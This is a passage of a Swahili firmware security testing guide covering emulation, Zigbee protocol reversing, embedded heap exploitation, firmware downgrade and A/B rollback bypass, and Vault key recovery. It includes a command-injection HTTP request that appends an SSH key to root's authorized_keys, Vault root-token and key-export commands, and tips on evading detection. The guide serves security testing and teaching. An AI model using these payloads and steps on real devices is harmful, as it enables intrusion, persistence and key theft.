Kagua hali endelevu nje ya guest wakati kuwaka polepole, startup scripts zinazoharibu data, au logi za console zisizoaminika zinaficha hitilafu. Usiwahi kuambatisha overlay ambayo VM inaitumia; ifichue kwa `qemu-nbd`, punguza ugunduzi wa LVM kwenye partition inayokusudiwa ya NBD, na uzime volume group kabla ya kuikata.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Kwa ajili ya kutenga hitilafu kwa njia inayoweza kurudiwa, andika faili za alama zenye mihuri ya muda kwenye volume thabiti inayoweza kuandikika, kisha uzithibitishe ukiwa nje ya kifaa; `/dev/kmsg`, FIFO, na consoles za muda zinaweza kutoa matokeo hasi ya uongo kutokana na udhibiti wa kasi au mchakato kufa mapema. Pia linganisha interfaces halisi katika tabaka zote kabla ya kubadilisha code isiyohusiana: `uname -r` dhidi ya `/lib/modules/`, vipengele vya ext4 vilivyo kwenye diski dhidi ya usanidi wa kernel, na kizazi cha Mesa `libGL` dhidi ya ABI ya DRI driver na majina ya driver yanayotokana na PCI. Kipengele kinaweza kuwepo na hata `dlopen()` kufanikiwa, lakini kikaendelea kutotumika kwa sababu consumer yake inatarajia ABI tofauti.<sup>[[11]](#references)</sup>

## Uchanganuzi wa Kienyeji kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au kilichoigwa hutumiwa kwa uchanganuzi. Ni muhimu kudumisha ufikiaji wa shell kwenye OS na filesystem. Emulation huenda isiige kikamilifu mwingiliano wa hardware, hivyo wakati mwingine itabidi uanzishe tena emulation. Uchanganuzi unapaswa kupitia filesystem tena, kutumia exploit dhidi ya webpages na network services zilizo wazi, na kuchunguza udhaifu wa bootloader. Majaribio ya uadilifu wa firmware ni muhimu ili kutambua uwezekano wa backdoor.

## Mbinu za Uchanganuzi wa Wakati wa Utekelezaji

Uchanganuzi wa wakati wa utekelezaji huhusisha kuingiliana na mchakato au binary katika mazingira yake ya uendeshaji, kwa kutumia zana kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kutambua udhaifu kupitia fuzzing na mbinu nyingine.

Kwa vifaa lengwa vilivyopachikwa visivyo na debugger kamili, **nakili `gdbserver` iliyounganishwa statically** kwenye kifaa na uiunganishe kwa mbali:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Uchoraji wa ramani ya ujumbe wa Zigbee / radio-co-processor

Kwenye IoT hubs, RF stack mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Njia muhimu ya kufuata ni:<sup>[[8]](#references)</sup>

1. **RF frame** hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye daemon kuu
5. **protocol-specific handler / state machine**

Muundo huu huunda malengo mawili ya reversing badala ya moja. Ikiwa controller inabadilisha binary radio frames kuwa protocol ya maandishi kama `Group,Command,arg1,arg2,...`, bainisha:

- **message groups** na dispatch tables
- Ni ujumbe gani unaweza kutoka **kwenye mtandao** na upi kutoka kwa controller yenyewe
- Sehemu halisi za **manufacturer-specific discriminator** (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handler zipi zinazofikiwa tu wakati wa **commissioning**, discovery, au hatua za kupakua firmware/model

Hasa kwa Zigbee, nasa pairing traffic na uhakiki kama kifaa lengwa bado kinategemea **Link Key** chaguomsingi `ZigBeeAlliance09`. Ikiwa ndivyo, kunusa commissioning traffic kunaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza hatari hii, kwa hiyo zingatia kama kifaa kilichojaribiwa kinazitekeleza kweli.

### Manufacturer-specific protocol handlers na ufikikaji unaodhibitiwa na FSM

Amri maalum za vendor za Zigbee/ZCL mara nyingi huwa shabaha bora kuliko clusters sanifu kwa sababu hupeleka data kwenye **custom parsing code** na **FSMs** za ndani zenye uthibitishaji ambao haujajaribiwa sana.<sup>[[8]](#references)</sup>

Mtiririko wa kazi wa vitendo:

- Fuatilia command dispatcher kwa reversing hadi upate **vendor-only handler**.
- Bainisha jedwali za **FSM state**, **event**, **check**, **action**, na **next-state**.
- Tambua **transitional states** zinazoendelea zenyewe, pamoja na matawi ya retry/error ambayo hatimaye huweka upya au kuachilia hali inayodhibitiwa na mshambulizi.
- Thibitisha ni mabadilishano gani halali ya protocol yanayohitajika ili daemon iingie katika hali iliyo hatarini, badala ya kudhani kuwa handler yenye hitilafu inaweza kufikiwa wakati wowote.

Kwa protocols zinazotegemea muda sahihi, packet replay kutoka Python framework inaweza kuwa polepole mno. Njia ya kuaminika zaidi ni kuiga kifaa halali kwenye hardware halisi (kwa mfano **nRF52840**) kwa kutumia stack ya kiwango cha vendor ili uweze kuonyesha **endpoints**, **attributes**, na muda sahihi wa commissioning.

### Aina ya hitilafu ya upakuaji wa sehemu katika embedded daemons

Aina ya hitilafu ya firmware inayojirudia hutokea kwenye upakuaji wa **blob/model/configuration uliogawanywa katika sehemu**:<sup>[[8]](#references)</sup>

1. **Sehemu ya kwanza** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga kumbukumbu kwa `malloc(total_size)`.
2. Sehemu zinazofuata hukagua tu sehemu za **packet-local** zinazodhibitiwa na mshambulizi, kama vile `packet_total_size >= offset + chunk_len`.
3. Nakala hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kuangalia kama inavuka **ukubwa wa awali uliotengwa**.

Hii humwezesha mshambulizi kutuma:

- Sehemu ya kwanza halali yenye ukubwa mdogo wa jumla uliotangazwa ili kulazimisha ugawaji mdogo wa kumbukumbu ya heap.
- Sehemu inayofuata yenye **offset inayotarajiwa** lakini `chunk_len` kubwa zaidi.
- Ukubwa wa packet-local ulioghushiwa unaopita ukaguzi mpya huku bado ukijaza kupita kiasi buffer iliyotengwa awali.

Ikiwa njia iliyo hatarini inalindwa na commissioning logic, exploitation lazima ijumuishwe na **device emulation** ya kutosha ili kuielekeza target kwenye hali inayotarajiwa ya model-download au blob-download kabla ya kutuma fragments zenye hitilafu.

### Vichochezi vya `free()` vinavyoendeshwa na protocol

Katika embedded daemons, njia rahisi zaidi ya kuchochea heap metadata exploitation mara nyingi si “kusubiri usafishaji” bali **kulazimisha ushughulikiaji wa makosa wa protocol yenyewe**:<sup>[[8]](#references)</sup>

- Tuma fragments za kufuatilia zenye hitilafu ili kusukuma FSM kwenye hali za **retry** au **error**.
- Vuka kikomo cha retry ili daemon **iweke upya context** na kuachilia buffer iliyoharibiwa.
- Tumia `free()` hii inayotabirika kuchochea allocator-side primitives kabla mchakato haujaanguka kwa sababu zisizohusiana.

Hii ni muhimu hasa dhidi ya allocators za **musl/uClibc/dlmalloc-like** kwenye embedded Linux, ambapo kuharibu chunk metadata kunaweza kugeuza unlink/unbin logic kuwa write primitive. Mbinu thabiti ni kuharibu **size field** ili kuelekeza allocator traversal kwenye **fake chunks zilizowekwa ndani ya buffer iliyojazwa kupita kiasi**, badala ya kuharibu moja kwa moja bin pointers halisi na kuangusha mchakato.

## Binary Exploitation na Proof-of-Concept

Kutengeneza PoC kwa vulnerabilities zilizobainishwa kunahitaji uelewa wa kina wa target architecture na ujuzi wa kupanga programu kwa lugha za kiwango cha chini. Ulinzi wa binary runtime kwenye embedded systems ni nadra, lakini unapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### Vidokezo vya udukuzi wa uClibc fastbin (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Ugawaji mkubwa wa kumbukumbu unaofuata unaweza kuchochea `__malloc_consolidate()`, kwa hiyo fake chunk yoyote lazima ipite ukaguzi (ukubwa unaokubalika, `fd = 0`, na chunks jirani zinazoonekana kuwa “in use”).<sup>[[6]](#references)</sup>
- **Binaries zisizo za PIE chini ya ASLR:** ikiwa ASLR imewashwa lakini binary kuu ni **non-PIE**, anwani za `.data/.bss` ndani ya binary hubaki thabiti. Unaweza kulenga eneo ambalo tayari linafanana na heap chunk header halali ili kufanya fastbin allocation iingie kwenye **function pointer table**.
- **NUL inayosimamisha parser:** JSON inapochanganuliwa, `\x00` kwenye payload inaweza kusimamisha uchanganuzi huku ikihifadhi baiti za mshambulizi zinazofuata kwa stack pivot/ROP chain.
- **Shellcode kupitia `/proc/self/mem`:** ROP chain inayotumia `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kuweka shellcode inayoweza kutekelezwa kwenye mapping inayojulikana na kurukia huko.

## Operating Systems Zilizoandaliwa kwa Uchambuzi wa Firmware

Operating systems kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyosanidiwa awali kwa ajili ya majaribio ya usalama wa firmware, yakiwa na zana zinazohitajika.

## OS Zilizoandaliwa kwa Uchambuzi wa Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyoundwa kukusaidia kufanya tathmini ya usalama na pentesting ya vifaa vya Internet of Things (IoT). Huokoa muda mwingi kwa kutoa mazingira yaliyosanidiwa awali yenye zana zote zinazohitajika.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operating system ya majaribio ya usalama wa embedded, inayotegemea Ubuntu 18.04 na iliyosheheni zana za majaribio ya usalama wa firmware.

## Mashambulizi ya Firmware Downgrade na Mbinu za Usasishaji Zisizo Salama

Hata vendor anapotekeleza ukaguzi wa saini za kriptografia kwa firmware images, **ulinzi dhidi ya kurejesha toleo la zamani (downgrade) mara nyingi hukosekana**. Boot- au recovery-loader inapothibitisha tu saini kwa kutumia public key iliyopachikwa lakini hailinganishi *version* (au counter inayoongezeka tu) ya image inayowekwa, mshambulizi anaweza kusakinisha kihalali **firmware ya zamani iliyo hatarini ambayo bado ina saini halali**, na hivyo kurudisha vulnerabilities zilizorekebishwa.<sup>[[4]](#references)</sup>

Mtiririko wa kawaida wa shambulio:

1. **Pata image ya zamani yenye saini**
   * Ipate kutoka kwenye tovuti ya umma ya kupakua ya vendor, CDN au tovuti ya usaidizi.
   * Itoe kutoka kwenye companion mobile/desktop applications (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
   * Ipate kutoka kwenye hazina za wahusika wengine kama VirusTotal, Internet archives, forums, n.k.
2. **Pakia au toa image kwa kifaa** kupitia channel yoyote ya usasishaji iliyo wazi:
   * Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
   * Vifaa vingi vya watumiaji vya IoT hutoa endpoints za HTTP(S) zisizohitaji uthibitishaji ambazo hukubali firmware blobs zilizosimbwa kwa Base64, huzifungua upande wa server na kuanzisha recovery/upgrade.
3. Baada ya downgrade, tumia vulnerability iliyorekebishwa kwenye toleo jipya zaidi (kwa mfano kichujio cha command-injection kilichoongezwa baadaye).
4. Kwa hiari, weka tena image ya hivi karibuni au zima updates ili kuepuka kugunduliwa baada ya kupata persistence.

### Mfano: Command Injection Baada ya Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Katika firmware iliyo hatarini (iliyoshushwa toleo), kigezo cha `md5` huongezwa moja kwa moja kwenye amri ya shell bila kusafishwa, hivyo kuruhusu kuingizwa kwa amri zozote (hapa, kuwezesha ufikiaji wa root kwa kutumia SSH key). Matoleo ya baadaye ya firmware yaliongeza kichujio cha msingi cha herufi, lakini kutokuwepo kwa ulinzi dhidi ya kushushwa toleo hufanya marekebisho hayo yasiwe na maana.<sup>[[4]](#references)</sup>

### Kutoa Firmware kutoka kwa Programu za Simu

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya programu za simu zinazohusiana na vifaa vyao, ili programu iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Kwa kawaida, vifurushi hivi huhifadhiwa bila usimbaji fiche ndani ya APK/APEX kwenye njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuwezesha kutoa picha zilizotiwa saini bila kugusa kifaa halisi.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass ya anti-rollback kupitia updater pekee katika miundo ya slot za A/B

Baadhi ya vendor hutekeleza **ratchet** ya kuzuia downgrade, lakini ndani ya mantiki ya *updater* pekee (kwa mfano, routine ya UDS kupitia CAN, amri ya recovery, au agent ya OTA ya userspace). Ikiwa **bootloader** hukagua tu sahihi/CRC ya image na kuamini jedwali la partition au metadata ya slot, ulinzi dhidi ya rollback bado unaweza kubypassiwa.<sup>[[7]](#references)</sup>

Muundo dhaifu wa kawaida:

- Metadata ya firmware ina maelezo ya toleo na **security ratchet** / kaunta ya monotonic.
- Updater hulinganisha ratchet ya image na thamani iliyohifadhiwa kwenye persistent storage na kukataa image za zamani zilizosainiwa.
- **Bootloader** haichanganui ratchet hiyo, na huthibitisha tu header, CRC na sahihi kabla ya kuwasha slot iliyochaguliwa.
- Uwezeshaji wa slot huhifadhiwa kando kwenye jedwali la partition au kaunta ya generation ya kila slot, na **haujaunganishwa kwa njia ya kriptografia** na digest halisi ya firmware iliyothibitishwa.

Hii hutengeneza primitive ya **thibitisha-image-moja / washa-image-nyingine** katika mifumo ya dual-slot. Ikiwa mshambuliaji anaweza kufanya updater iweke slot B kama lengwa la kuwashwa baadaye kwa kutumia image iliyosainiwa ya sasa, kisha akaandika upya slot B kabla ya kuwasha upya, bootloader bado inaweza kuwasha image iliyodowngrade kwa sababu huamini tu metadata ya slot ambayo tayari imehifadhiwa.

Muundo wa kawaida wa matumizi mabaya:

1. Pakia firmware **ya sasa iliyosainiwa** kwenye slot tulivu, kisha endesha routine ya kawaida ya uthibitishaji/ubadilishaji ili mpangilio uweke slot hiyo kuwa inayofuata kuwashwa.
2. **Usiwashie upya bado**. Ingia tena kwenye routine ya kuandaa/kufuta slot katika session hiyo hiyo.
3. Tumia vibaya hali ya boot iliyopitwa na wakati au mantiki ya uchaguzi wa slot iliyopitwa na wakati ili updater ifute **slot ileile halisi** iliyopandishwa tu.
4. Andika firmware **ya zamani lakini bado iliyosainiwa** kwenye slot hiyo.
5. Ruka routine ya uthibitishaji inayotekeleza ratchet na uwashe upya moja kwa moja.
6. Bootloader huchagua slot iliyopandishwa, huthibitisha sahihi/uhalisi pekee, kisha huwasha image ya zamani.

Mambo ya kutafuta unapofanya reverse engineering ya utekelezaji wa update za A/B:

- Uchaguzi wa slot unatokana na **bendera za wakati wa kuwasha** ambazo hazisasishwi baada ya ubadilishaji kufanikiwa.
- Routine ya mtindo wa `prepare_passive_slot()` inayofuta slot kwa kutegemea hali iliyopitwa na wakati badala ya **mpangilio wa sasa uliothibitishwa**.
- Function ya mtindo wa `part_write_layout()` inayoongeza tu **kaunta ya generation** / bendera ya active, bila kuhifadhi hash ya image iliyothibitishwa.
- Ukaguzi wa ratchet unaotekelezwa kwenye userspace au msimbo wa updater, lakini **si** kwenye ROM / bootloader / hatua za secure boot.
- Routine za kufuta au recovery zinazoacha slot ikiwa imetiwa alama ya kuwashwa hata baada ya maudhui yake kuondolewa na kuandikwa upya.

### Orodha ya Ukaguzi wa Mantiki ya Update

* Je, usafirishaji/data na uthibitishaji wa *update endpoint* vinalindwa vya kutosha (TLS + uthibitishaji)?
* Je, kifaa hulinganisha **nambari za toleo** au **kaunta ya monotonic ya anti-rollback** kabla ya kufanya flashing?
* Je, image huthibitishwa ndani ya secure boot chain (kwa mfano, sahihi hukaguliwa na msimbo wa ROM)?
* Je, **bootloader hutekeleza ratchet ileile** kama updater, badala ya kukagua sahihi/CRC pekee?
* Je, metadata ya kuwezesha slot **imefungamanishwa na digest/toleo la firmware lililothibitishwa**, au slot inaweza kubadilishwa baada ya kupandishwa?
* Baada ya ubadilishaji wa slot kufanikiwa, je, kifaa hulazimishwa kuwashwa upya au routine za baadaye za update/kufuta bado zinaweza kufikiwa katika session hiyo hiyo?
* Je, msimbo wa userland hufanya ukaguzi wa ziada wa uhalali (kwa mfano, ramani ya partition inayoruhusiwa, nambari ya modeli)?
* Je, mtiririko wa update wa *sehemu* au wa *backup* hutumia tena mantiki ileile ya uthibitishaji?

> 💡 Ikiwa lolote kati ya yaliyo hapo juu halipo, huenda mfumo huo uko hatarini kushambuliwa kwa rollback.

## Firmware dhaifu ya kufanyia mazoezi

Ili kufanya mazoezi ya kugundua udhaifu kwenye firmware, tumia miradi ifuatayo ya firmware dhaifu kama mwanzo.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Mradi wa Firmware ya Router Iliyo Hatarini kwa Makusudi
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kupata tena funguo za usimbuaji wa firmware kutoka kwa hali ya KMS/Vault iliyopachikwa

Picha ya update inapochanganya metadata ndogo ya maandishi yasiyosimbwa na blob kubwa yenye entropy ya juu, kagua muundo wa kontena kabla ya kujaribu brute-force:<sup>[[1]](#references)</sup>

- Tupa headers, offsets na mipaka ya mistari ukitumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida huashiria umbizo la OpenSSL `enc`: baiti 8 zinazofuata ni salt, na baiti zilizosalia ni ciphertext.
- Sehemu ya Base64 inayofumbuliwa kuwa baiti `256` haswa ni kidokezo kikubwa kwamba unatazama ciphertext ya RSA-2048 inayofunga password/random key ya session ya firmware.
- Nyenzo ya PGP iliyotenganishwa katika faili hilohilo mara nyingi hulinda uhalisi pekee; usidhani ndiyo utaratibu wa usiri.

Ikiwa utafutaji wa funguo tuli (`grep`, `strings`, utafutaji wa PEM/PGP) hautafaulu, fanya reverse engineering ya **njia halisi ya usimbuaji** badala ya kutafuta funguo binafsi pekee:

- Decompile binary ya updater / usimamizi na ufuatilie ni nani anayesoma blob iliyosimbwa, ni helper/API gani inayofungua usimbuaji wake, na jina la kimantiki la ufunguo inaloliomba.
- Tafuta hali ya KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na unit files na init scripts kwenye root filesystem iliyotolewa.
- Chukulia amri za `vault operator unseal ...` za maandishi yasiyosimbwa, recovery keys, bootstrap tokens, au scripts za kufungua KMS za ndani kiotomatiki kuwa sawa na nyenzo za private key.

Ikiwa kifaa kina binary asilia ya Vault na storage backend, kwa kawaida ni rahisi zaidi kuiga mazingira hayo kuliko kutekeleza upya mambo ya ndani ya Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Ukiwa na root kwenye KMS iliyoklonishwa:

- Fanya transit keys ziweze kuhamishwa nje tu ndani ya clone iliyotengwa: `vault write transit/keys/<name>/config exportable=true`
- Hamisha ufunguo wa unwrap: `vault read transit/export/encryption-key/<name>`
- Jaribu RSA key iliyorejeshwa kwa jozi halisi ya padding/hash inayotumiwa na KMS. Kushindwa kwa decryption ya PKCS#1 v1.5 na kushindwa kwa decryption chaguomsingi ya OAEP **hakuthibitishi** kuwa key si sahihi; mifumo mingi inayotegemea Vault hutumia OAEP yenye SHA-256, ilhali maktaba za kawaida hutumia SHA-1 kama chaguomsingi.
- Ikiwa payload inaanza na `Salted__`, tekeleza upya KDF ya OpenSSL ya vendor kama ilivyo hasa (`EVP_BytesToKey`, mara nyingi MD5 kwenye vifaa vya zamani) kabla ya kujaribu decryption ya AES-CBC.

Hii hubadilisha “firmware iliyosimbwa” kuwa tatizo pana zaidi: **rejesha operational keys za upande wa kifaa, kisha tekeleza upya vigezo halisi vya unwrap + KDF nje ya mtandao**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kuvunja Usimbaji wa Firmware kwa Claude: Ujuzi wa Kiwandani, Kujitegemea kwa Kiwango cha Mwanzo](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Udukuzi wa IoT kwa Vitendo: Mwongozo Kamili wa Kushambulia Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Kutumia zero-days kwenye vifaa vilivyoachwa – blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jinsi Kifaa Mahiri cha $20 Kilivyonipa Ufikiaji wa Nyumba Yako](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sasa Unaniona: Sasa Umetekwa](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Kutumia Tesla Wall Connector kupitia kiunganishi chake cha chaji - Sehemu ya 2: kukwepa kinga dhidi ya kushusha toleo](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Iwashe: Kutumia Philips Hue Bridge kupitia hewani](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS kwenye QEMU Sehemu ya 1: Kufungua kifurushi](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Nyaraka za Linux kernel - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS kwenye QEMU Sehemu ya 2: Kutatua hitilafu na Kurekebisha](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Nywila za Dell BIOS: Usimbaji dhaifu wa XOR huruhusu urejeshaji kutoka SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Zana za kurejesha nywila za Dell BIOS](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
